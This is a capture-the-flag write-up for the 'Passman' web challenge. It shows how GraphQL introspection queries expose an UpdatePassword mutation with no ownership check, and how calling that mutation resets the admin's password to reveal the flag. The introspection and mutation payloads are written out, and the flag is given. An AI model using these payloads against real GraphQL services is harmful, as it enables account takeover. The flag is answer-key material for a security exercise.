# web/Passman

### Description
> Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?

After opening website we see login page:
![passman1](/2023/Cyber_Apocalypse/web/images/passman1.png)

From it we can go to register, when trying to create admin account it gives SQL error that it already exists:
![passman2](/2023/Cyber_Apocalypse/web/images/passman2.png)

So let's create user account and login into it
After login we can see dashboard with password records which we can create

In `/static/js/app.js` we can see than records received through **GraphQL**:

```
const loadPasswords = async () => {

    await fetch(`/graphql`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
               query: '{ getPhraseList { id, owner, type, address, username, password, note } }'
           }),
       })
        .then((response) => response.json())
        .then((response) => {
           if (response.data.getPhraseList && response.data.getPhraseList.length != 0) {
               populateTable(response.data.getPhraseList)
           }
       })
        .catch((error) => console.log(error));
}
```
And query is sent as parameter by user so it's changeable 

To get info about GraphQL structure we can make this query: 
`{"query":"{__schema{types{name,fields{name}}}}"}`

From it we can see all possible mutations. 
`{"name":"Mutation","fields":[{"name":"RegisterUser"},{"name":"LoginUser"},{"name":"UpdatePassword"},{"name":"AddPhrase"}]},`

UpdatePassword looks interesting, let's check it in detail:
`{"query":"{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}"}`
Gives us 
`{"name":"UpdatePassword","args":[{"name":"username","description":null,"type":{"name":null,"kind":"NON_NULL","ofType":{"name":"String","kind":"SCALAR"}}},{"name":"password","description":null,"type":{"name":null,"kind":"NON_NULL","ofType":{"name":"String","kind":"SCALAR"}}}`

It doesn't require old password so we can change admin's password (don't forget cookie)

`{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"1111"}}`

![passman3](/2023/Cyber_Apocalypse/web/images/passman3.png)

And we got the flag

![passman4](/2023/Cyber_Apocalypse/web/images/passman4.png)

*HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}*
